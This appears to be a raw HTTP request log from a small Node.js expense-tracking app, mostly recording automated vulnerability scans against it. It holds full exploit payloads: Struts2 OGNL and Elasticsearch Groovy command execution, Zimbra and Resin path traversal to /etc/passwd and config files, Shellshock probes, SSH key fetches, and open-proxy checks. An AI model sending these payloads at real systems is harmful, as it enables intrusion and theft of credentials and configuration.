+[0mGET /is/ [0m- [0m- ms - -[0m
+Not Found
+Not Found
+Not Found
+Not Found
+Not Found
+Not Found
+Not Found
+[0mGET /secure/Dashboard.jspa [0m- [0m- ms - -[0m
+Not Found
+[0mGET /neteagle/ [0m- [0m- ms - -[0m
+Not Found
+[0mGET /cgi-bin/printenv [0m- [0m- ms - -[0m
+[0mGET /web/.svn/entries [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m1.691 ms - 2732[0m
+[0mGET /netflow/jspui/NetworkSnapShot.jsp [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET /logs/ [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m1.386 ms - 2732[0m
+[0mGET /_search?source=%7B%22size%22%3A1%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22java.lang.Math.class.forName%28%5C%22java.lang.Runtime%5C%22%29.getRuntime%28%29.exec%28%5C%22netstat+-an%5C%22%29.getText%28%29%22%2C%22lang%22%3A%22groovy%22%7D%7D%7D [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m1.404 ms - 2732[0m
+[0mGET /res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fzimbra%2Fconf%2Flocalconfig.xml%00 [0m- [0m- ms - -[0m
+[0mGET /apps/ [0m- [0m- ms - -[0m
+[0mGET /mark/brand!save.action?redirect%3A%24%7B%23s%3Dnew+java.util.ArrayList%28%29%2C%23x%3Dnew+java.lang.String%28%22netstat%22%29%2C%23xx%3Dnew+java.lang.String%28%22-an%22%29%2C%23s.add%28%23x%29%2C%23s.add%28%23xx%29%2C%23a%3Dnew+java.lang.ProcessBuilder%28%23s%29.start%28%29.getInputStream%28%29%2C%23b%3Dnew+java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew+java.io.BufferedReader%28%23b%29%2C%23d%3Dnew+char%5B51020%5D%2C%23c.read%28%23d%29%2C%23mbqdpz%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29%2C%23mbqdpz.println%28%23d%29%2C%23mbqdpz.close%28%29%7D [0m- [0m- ms - -[0m
+[0mGET /.ssh/id_rsa [0m- [0m- ms - -[0m
+Not Found
+[0mGET /resin-doc/viewfile/?contextpath&servletpath&file=WEB-INF%2Fweb.xml [0m- [0m- ms - -[0m
+Not Found
+Not Found
+Not Found
+Not Found
+Not Found
+[0mGET /info.php [0m- [0m- ms - -[0m
+Not Found
+Not Found
+Not Found
+[0mGET /_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22java.lang.StringBuilder+buf%3Dnew+java.lang.StringBuilder%28%29%3Bjava.io.BufferedReader+r%3Dnew+java.io.BufferedReader%28new+java.io.InputStreamReader%28java.lang.Runtime.getRuntime%28%29.exec%28%5C%22netstat+-an%5C%22%29.getInputStream%28%29%29%29%3Bjava.lang.String+line%3Dnull%3Bwhile%28%28line%3Dr.readLine%28%29%29%21%3Dnull%29%7Bbuf.append%28line%2B%5C%22%5Cr%5Cn%5C%22%29%3B%7Dreturn+buf.toString%28%29%22%7D%7D%7D [0m- [0m- ms - -[0m
+Not Found
+[0mGET /cgi-bin/test-cgi?%28%29%7B%3A%3B%7D%3Becho+-e+%27%5Cr%5CnShellShock%3A+yes%2Cby+scanner%27 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /.ssh/id_dsa [0m- [0m- ms - -[0m
+[0mGET /static/ [0m- [0m- ms - -[0m
+Not Found
+[0mGET /jspui/NetworkSnapShot.jsp [0m- [0m- ms - -[0m
+[0mGET /wx/.svn/entries [0m- [0m- ms - -[0m
+[0mGET /jenkins [0m- [0m- ms - -[0m
+[0mGET /zimbraAdmin/res/I18nMsg,cAjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fzimbra%2Fconf%2Flocalconfig.xml%00 [0m- [0m- ms - -[0m
+[0mGET /node [0m- [0m- ms - -[0m
+[0mGET /domain/index.do?redirect%3A%24%7B%23s%3Dnew+java.util.ArrayList%28%29%2C%23x%3Dnew+java.lang.String%28%22netstat%22%29%2C%23xx%3Dnew+java.lang.String%28%22-an%22%29%2C%23s.add%28%23x%29%2C%23s.add%28%23xx%29%2C%23a%3Dnew+java.lang.ProcessBuilder%28%23s%29.start%28%29.getInputStream%28%29%2C%23b%3Dnew+java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew+java.io.BufferedReader%28%23b%29%2C%23d%3Dnew+char%5B51020%5D%2C%23c.read%28%23d%29%2C%23mbqdpz%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29%2C%23mbqdpz.println%28%23d%29%2C%23mbqdpz.close%28%29%7D [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m1.854 ms - 2732[0m
+[0mGET /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=file%3A%2F%2F%2Fetc%2Fpasswd [0m- [0m- ms - -[0m
+Not Found
+Not Found
+Not Found
+Not Found
+Not Found
+[0mGET /i.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /login.cgi [0m- [0m- ms - -[0m
+[0mGET /.svn/text-base/index.jsp.svn-base [0m- [0m- ms - -[0m
+[0mGET /zimbra/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fzimbra%2Fconf%2Flocalconfig.xml%00 [0m- [0m- ms - -[0m
+[0mGET /cardsystem/card!search.action?redirect%3A%24%7B%23s%3Dnew+java.util.ArrayList%28%29%2C%23x%3Dnew+java.lang.String%28%22netstat%22%29%2C%23xx%3Dnew+java.lang.String%28%22-an%22%29%2C%23s.add%28%23x%29%2C%23s.add%28%23xx%29%2C%23a%3Dnew+java.lang.ProcessBuilder%28%23s%29.start%28%29.getInputStream%28%29%2C%23b%3Dnew+java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew+java.io.BufferedReader%28%23b%29%2C%23d%3Dnew+char%5B51020%5D%2C%23c.read%28%23d%29%2C%23mbqdpz%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29%2C%23mbqdpz.println%28%23d%29%2C%23mbqdpz.close%28%29%7D [0m- [0m- ms - -[0m
+Not Found
+[0mGET /_plugin/head/../../../config/elasticsearch.yml [0m- [0m- ms - -[0m
+Not Found
+[0mGET /.svn/text-base/index.php.svn-base [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET /search!medalSearch.action?redirect%3A%24%7B%23s%3Dnew+java.util.ArrayList%28%29%2C%23x%3Dnew+java.lang.String%28%22netstat%22%29%2C%23xx%3Dnew+java.lang.String%28%22-an%22%29%2C%23s.add%28%23x%29%2C%23s.add%28%23xx%29%2C%23a%3Dnew+java.lang.ProcessBuilder%28%23s%29.start%28%29.getInputStream%28%29%2C%23b%3Dnew+java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew+java.io.BufferedReader%28%23b%29%2C%23d%3Dnew+char%5B51020%5D%2C%23c.read%28%23d%29%2C%23mbqdpz%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29%2C%23mbqdpz.println%28%23d%29%2C%23mbqdpz.close%28%29%7D [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET /.svn/text-base/index.html.svn-base [0m- [0m- ms - -[0m
+[0mGET /p.php [0m- [0m- ms - -[0m
+[0mGET /index.cgi [0m- [0m- ms - -[0m
+Not Found
+[0mGET /res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /bbs/search.do?redirect%3A%24%7B%23s%3Dnew+java.util.ArrayList%28%29%2C%23x%3Dnew+java.lang.String%28%22netstat%22%29%2C%23xx%3Dnew+java.lang.String%28%22-an%22%29%2C%23s.add%28%23x%29%2C%23s.add%28%23xx%29%2C%23a%3Dnew+java.lang.ProcessBuilder%28%23s%29.start%28%29.getInputStream%28%29%2C%23b%3Dnew+java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew+java.io.BufferedReader%28%23b%29%2C%23d%3Dnew+char%5B51020%5D%2C%23c.read%28%23d%29%2C%23mbqdpz%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29%2C%23mbqdpz.println%28%23d%29%2C%23mbqdpz.close%28%29%7D [0m- [0m- ms - -[0m
+[0mGET /index.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /zimbraAdmin/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 [0m- [0m- ms - -[0m
+Not Found
+[0mGET / [32m200 [0m1.454 ms - 2732[0m
+[0mGET /struts2-blank/example/HelloWorld.action?redirect%3A%24%7B%23s%3Dnew+java.util.ArrayList%28%29%2C%23x%3Dnew+java.lang.String%28%22netstat%22%29%2C%23xx%3Dnew+java.lang.String%28%22-an%22%29%2C%23s.add%28%23x%29%2C%23s.add%28%23xx%29%2C%23a%3Dnew+java.lang.ProcessBuilder%28%23s%29.start%28%29.getInputStream%28%29%2C%23b%3Dnew+java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew+java.io.BufferedReader%28%23b%29%2C%23d%3Dnew+char%5B51020%5D%2C%23c.read%28%23d%29%2C%23mbqdpz%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29%2C%23mbqdpz.println%28%23d%29%2C%23mbqdpz.close%28%29%7D [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET /dashboard/phpinfo.php [0m- [0m- ms - -[0m
+[0mGET /login.action?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75%40java.util.Collections%40EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43mycmd%5C75%5C%27netstat%5C40-an%5C%27%27%29%28d%29%29&%28h%29%28%28%27%5C43myret%5C75%40java.lang.Runtime%40getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&%28j%29%28%28%27%5C43myres%5C75new%5C40byte%5B51020%5D%27%29%28d%29%29&%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&%28m%29%28%28%27%5C43myout%5C75%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28d%29%29&%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /login.do?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75%40java.util.Collections%40EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43mycmd%5C75%5C%27netstat%5C40-an%5C%27%27%29%28d%29%29&%28h%29%28%28%27%5C43myret%5C75%40java.lang.Runtime%40getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&%28j%29%28%28%27%5C43myres%5C75new%5C40byte%5B51020%5D%27%29%28d%29%29&%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&%28m%29%28%28%27%5C43myout%5C75%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28d%29%29&%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /mark/brand!save.action?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75%40java.util.Collections%40EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43mycmd%5C75%5C%27netstat%5C40-an%5C%27%27%29%28d%29%29&%28h%29%28%28%27%5C43myret%5C75%40java.lang.Runtime%40getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&%28j%29%28%28%27%5C43myres%5C75new%5C40byte%5B51020%5D%27%29%28d%29%29&%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&%28m%29%28%28%27%5C43myout%5C75%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28d%29%29&%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /domain/index.do?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75%40java.util.Collections%40EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43mycmd%5C75%5C%27netstat%5C40-an%5C%27%27%29%28d%29%29&%28h%29%28%28%27%5C43myret%5C75%40java.lang.Runtime%40getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&%28j%29%28%28%27%5C43myres%5C75new%5C40byte%5B51020%5D%27%29%28d%29%29&%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&%28m%29%28%28%27%5C43myout%5C75%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28d%29%29&%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /cardsystem/card!search.action?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75%40java.util.Collections%40EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43mycmd%5C75%5C%27netstat%5C40-an%5C%27%27%29%28d%29%29&%28h%29%28%28%27%5C43myret%5C75%40java.lang.Runtime%40getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&%28j%29%28%28%27%5C43myres%5C75new%5C40byte%5B51020%5D%27%29%28d%29%29&%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&%28m%29%28%28%27%5C43myout%5C75%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28d%29%29&%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /search!medalSearch.action?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75%40java.util.Collections%40EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43mycmd%5C75%5C%27netstat%5C40-an%5C%27%27%29%28d%29%29&%28h%29%28%28%27%5C43myret%5C75%40java.lang.Runtime%40getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&%28j%29%28%28%27%5C43myres%5C75new%5C40byte%5B51020%5D%27%29%28d%29%29&%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&%28m%29%28%28%27%5C43myout%5C75%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28d%29%29&%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /bbs/search.do?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75%40java.util.Collections%40EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43mycmd%5C75%5C%27netstat%5C40-an%5C%27%27%29%28d%29%29&%28h%29%28%28%27%5C43myret%5C75%40java.lang.Runtime%40getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&%28j%29%28%28%27%5C43myres%5C75new%5C40byte%5B51020%5D%27%29%28d%29%29&%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&%28m%29%28%28%27%5C43myout%5C75%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28d%29%29&%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /struts2-blank/example/HelloWorld.action?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75%40java.util.Collections%40EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43mycmd%5C75%5C%27netstat%5C40-an%5C%27%27%29%28d%29%29&%28h%29%28%28%27%5C43myret%5C75%40java.lang.Runtime%40getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&%28j%29%28%28%27%5C43myres%5C75new%5C40byte%5B51020%5D%27%29%28d%29%29&%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&%28m%29%28%28%27%5C43myout%5C75%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28d%29%29&%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /login.action?debug=command&expression=%27http-scanner%3A+struts2+command+exec%27%2B%27in+debug+mode%27 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /login.do?debug=command&expression=%27http-scanner%3A+struts2+command+exec%27%2B%27in+debug+mode%27 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /mark/brand!save.action?debug=command&expression=%27http-scanner%3A+struts2+command+exec%27%2B%27in+debug+mode%27 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /domain/index.do?debug=command&expression=%27http-scanner%3A+struts2+command+exec%27%2B%27in+debug+mode%27 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /cardsystem/card!search.action?debug=command&expression=%27http-scanner%3A+struts2+command+exec%27%2B%27in+debug+mode%27 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /search!medalSearch.action?debug=command&expression=%27http-scanner%3A+struts2+command+exec%27%2B%27in+debug+mode%27 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /bbs/search.do?debug=command&expression=%27http-scanner%3A+struts2+command+exec%27%2B%27in+debug+mode%27 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /struts2-blank/example/HelloWorld.action?debug=command&expression=%27http-scanner%3A+struts2+command+exec%27%2B%27in+debug+mode%27 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9633779826957055 [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_98169543623112202236860 [32m200 [0m1.467 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_1960887927016662724194792 [32m200 [0m2.088 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_10258848009328411932000 [32m200 [0m1.425 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_87108120971072536281774024 [32m200 [0m1.414 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_3065928445760482254817671360 [32m200 [0m1.430 ms - 2732[0m
+[0mGET / [32m200 [0m1.320 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5240531877759811 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7635769825319116 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.sogou.com/?rands=_780462727549924153504 [32m200 [0m4.377 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_2002083992019273982624832 [32m200 [0m1.320 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_51567805411385992794512 [32m200 [0m1.947 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_3325196812662697258160 [32m200 [0m1.552 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_587545403210845003218280 [32m200 [0m1.358 ms - 2732[0m
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m1.496 ms - 2732[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m1.414 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7179354499029880 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://testp1.piwo.pila.pl/testproxy.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+[0mGET /accountDetail? [32m200 [0m46.649 ms - 278[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m7.877 ms - 5058[0m
+[0mGET /monthHistory? [32m200 [0m2.691 ms - 137[0m
+[0mGET /moneyDetail?limit=10&offset=10 [32m200 [0m5.690 ms - 4815[0m
+userName lilieming
+[{"userName":"lilieming","label":"晚餐","modifyTime":1461930981971,"count":2,"_id":"572211391efc4003029edde5"}] result is 
+[0mPUT /moneyDetail [32m200 [0m7.331 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+userName lilieming
+[] result is 
+[0mPUT /moneyDetail [32m200 [0m6.109 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m5.911 ms - 4892[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+task begin
+user colour.hu  has no data
+bakcup  data length is: undefined
+[0mGET http://115.239.210.27/ [32m200 [0m2.869 ms - 2732[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://115.239.210.27/ [32m200 [0m1.497 ms - 2732[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3804662463476116 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_10003101721621023283694208 [32m200 [0m4.528 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_940070627214821504208520 [32m200 [0m1.441 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_1506579170823368325220 [32m200 [0m1.419 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_751121276010108563286396 [32m200 [0m1.407 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_1318291520229772908488 [32m200 [0m1.630 ms - 2732[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m8.817 ms - 2732[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3776760334296182 [0m- [0m- ms - -[0m
+Not Found
+[0mGET /_config/httpd/ [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7532906236925798 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://119.90.40.16:8090/ [32m200 [0m7.354 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7890912534138660 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
